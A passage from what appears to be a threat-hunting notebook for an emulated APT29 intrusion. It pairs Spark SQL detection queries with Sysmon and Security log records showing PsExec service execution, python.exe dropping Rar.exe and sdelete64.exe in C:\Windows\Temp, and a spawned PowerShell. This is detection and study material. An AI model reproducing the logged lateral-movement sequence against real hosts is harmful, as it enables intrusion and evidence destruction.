 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-5924-stderr 
 SubjectUserName    | pbeesly                       
-RECORD 8-------------------------------------------
 EventTime          | 2020-05-01 23:13:49           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC                      
 SubjectUserName    | pbeesly                       
-RECORD 9-------------------------------------------
 EventTime          | 2020-05-01 23:13:49           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-1412-stdin  
 SubjectUserName    | pbeesly                       
-RECORD 10------------------------------------------
 EventTime          | 2020-05-01 23:13:49           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-1412-stdout 
 SubjectUserName    | pbeesly                       
-RECORD 11------------------------------------------
 EventTime          | 2020-05-01 23:13:49           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-1412-stderr 
 SubjectUserName    | pbeesly                       
-RECORD 12------------------------------------------
 EventTime          | 2020-05-01 23:15:03           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC                      
 SubjectUserName    | pbeesly                       
-RECORD 13------------------------------------------
 EventTime          | 2020-05-01 23:15:03           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-8928-stdin  
 SubjectUserName    | pbeesly                       
-RECORD 14------------------------------------------
 EventTime          | 2020-05-01 23:15:03           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-8928-stdout 
 SubjectUserName    | pbeesly                       
-RECORD 15------------------------------------------
 EventTime          | 2020-05-01 23:15:03           
 Hostname           | NASHUA.dmevals.local          
 ShareName          | \\*\IPC$                      
 RelativeTargetName | PSEXESVC-SCRANTON-8928-stderr 
 SubjectUserName    | pbeesly                       
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="c-3-service-execution">
<h2>8.C.3. Service Execution<a class="headerlink" href="#c-3-service-execution" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed python.exe using PSExec</p>
<p><strong>Criteria:</strong> python.exe spawned by PSEXESVC.exe</p>
<div class="section" id="id61">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id61" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:BDE98B9B-77DD-4AD4-B755-463C3C27EE5F</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host b</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">        AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">) a</span>
<span class="sd">ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND Image LIKE &#39;%python.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:11:40.213
ProcessGuid: {5aa8ec29-e4ec-5eac-6803-000000000400}
ProcessId: 2792
Image: C:\Windows\Temp\python.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\python.exe&quot; 
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e4ec-5eac-2578-860000000000}
LogonId: 0x867825
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {5aa8ec29-e4eb-5eac-6703-000000000400}
ParentProcessId: 9204
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\windows\PSEXESVC.exe 
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:12:46.846
ProcessGuid: {5aa8ec29-e52e-5eac-6b03-000000000400}
ProcessId: 1088
Image: C:\Windows\Temp\python.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\python.exe&quot; 
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e52e-5eac-9ab5-860000000000}
LogonId: 0x86B59A
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {5aa8ec29-e52e-5eac-6a03-000000000400}
ParentProcessId: 5920
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\windows\PSEXESVC.exe 
-RECORD 2-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:13:49.648
ProcessGuid: {5aa8ec29-e56d-5eac-6e03-000000000400}
ProcessId: 4592
Image: C:\Windows\Temp\python.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\python.exe&quot; 
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e56d-5eac-53e3-860000000000}
LogonId: 0x86E353
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {5aa8ec29-e56d-5eac-6d03-000000000400}
ParentProcessId: 8308
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\windows\PSEXESVC.exe 
-RECORD 3-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:15:03.954
ProcessGuid: {5aa8ec29-e5b7-5eac-7703-000000000400}
ProcessId: 2952
Image: C:\Windows\Temp\python.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: &quot;C:\Windows\Temp\python.exe&quot; 
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e5b7-5eac-7d17-890000000000}
LogonId: 0x89177D
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000
ParentProcessGuid: {5aa8ec29-e5b7-5eac-7603-000000000400}
ParentProcessId: 1624
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\windows\PSEXESVC.exe 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:11D81CCD-163F-4347-8F1D-072F4B4B3B26</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host b</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND ParentProcessName LIKE &#39;%services.exe&#39;</span>
<span class="sd">) a</span>
<span class="sd">ON b.ProcessId = a.NewProcessId</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND NewProcessName LIKE &#39;%python.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NASHUA$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x867825

Process Information:
	New Process ID:		0xae8
	New Process Name:	C:\Windows\Temp\python.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x23f4
	Creator Process Name:	C:\Windows\PSEXESVC.exe
	Process Command Line:	&quot;C:\Windows\Temp\python.exe&quot; 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.  
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NASHUA$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x86B59A

Process Information:
	New Process ID:		0x440
	New Process Name:	C:\Windows\Temp\python.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1720
	Creator Process Name:	C:\Windows\PSEXESVC.exe
	Process Command Line:	&quot;C:\Windows\Temp\python.exe&quot; 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.  
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NASHUA$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x86E353

Process Information:
	New Process ID:		0x11f0
	New Process Name:	C:\Windows\Temp\python.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x2074
	Creator Process Name:	C:\Windows\PSEXESVC.exe
	Process Command Line:	&quot;C:\Windows\Temp\python.exe&quot; 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
-RECORD 3----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		NASHUA$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x89177D

Process Information:
	New Process ID:		0xb88
	New Process Name:	C:\Windows\Temp\python.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x658
	Creator Process Name:	C:\Windows\PSEXESVC.exe
	Process Command Line:	&quot;C:\Windows\Temp\python.exe&quot; 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.   
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id62">
<h2>9.A.1. Remote File Copy<a class="headerlink" href="#id62" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Dropped rar.exe to disk on remote host NASHUA (10.0.1.6)</p>
<p><strong>Criteria:</strong> python.exe creating the file rar.exe</p>
<div class="section" id="id63">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id63" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:1C94AFAF-74A9-4578-B026-7AA6948D9DBE</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT b.ProcessGuid</span>
<span class="sd">        FROM apt29Host b</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">        ) a</span>
<span class="sd">        ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 11</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:15:38.985
ProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ProcessId: 2172
Image: C:\Windows\Temp\python.exe
TargetFilename: C:\Windows\Temp\sdelete64.exe
CreationUtcTime: 2020-05-02 03:15:38.985 
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:15:31.530
ProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ProcessId: 2172
Image: C:\Windows\Temp\python.exe
TargetFilename: C:\Windows\Temp\Rar.exe
CreationUtcTime: 2020-05-02 03:15:31.530       
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-2-remote-file-copy">
<h2>9.A.2. Remote File Copy<a class="headerlink" href="#a-2-remote-file-copy" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Dropped rar.exe to disk on remote host NASHUA (10.0.1.6)</p>
<p><strong>Criteria:</strong> python.exe creating the file sdelete64.exe</p>
<div class="section" id="id64">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id64" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:F98D589E-94A9-4974-A142-7E75D9760118</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT b.ProcessGuid</span>
<span class="sd">        FROM apt29Host b</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">        ) a</span>
<span class="sd">        ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 11</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:15:38.985
ProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ProcessId: 2172
Image: C:\Windows\Temp\python.exe
TargetFilename: C:\Windows\Temp\sdelete64.exe
CreationUtcTime: 2020-05-02 03:15:38.985 
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | File created:
RuleName: -
UtcTime: 2020-05-02 03:15:31.530
ProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ProcessId: 2172
Image: C:\Windows\Temp\python.exe
TargetFilename: C:\Windows\Temp\Rar.exe
CreationUtcTime: 2020-05-02 03:15:31.530       
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-powershell">
<h2>9.B.1. PowerShell<a class="headerlink" href="#b-1-powershell" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Spawned interactive powershell.exe</p>
<p><strong>Criteria:</strong> powershell.exe​ spawning from python.exe</p>
<div class="section" id="id65">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id65" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:77D403CE-2832-4927-B74A-42D965B5AF94</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">        SELECT b.ProcessGuid</span>
<span class="sd">        FROM apt29Host b</span>
<span class="sd">        INNER JOIN (</span>
<span class="sd">          SELECT ProcessGuid</span>
<span class="sd">          FROM apt29Host</span>
<span class="sd">          WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">              AND EventID = 1</span>
<span class="sd">              AND ParentImage LIKE &#39;%services.exe&#39;</span>
<span class="sd">        ) a</span>
<span class="sd">        ON b.ParentProcessGuid = a.ProcessGuid</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND Image LIKE &#39;%python.exe&#39;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid = c.ProcessGuid</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">) e</span>
<span class="sd">ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND Image LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 03:15:48.652
ProcessGuid: {5aa8ec29-e5e4-5eac-7a03-000000000400}
ProcessId: 4876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {5aa8ec29-e5b7-5eac-7d17-890000000000}
LogonId: 0x89177D
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {5aa8ec29-e5b8-5eac-7903-000000000400}
ParentProcessId: 2172
ParentImage: C:\Windows\Temp\python.exe
ParentCommandLine: &quot;C:\Windows\Temp\python.exe&quot;  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:B56C6666-EEF3-4028-85D4-6AAE01CD506C</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT d.NewProcessId</span>
<span class="sd">    FROM apt29Host d</span>
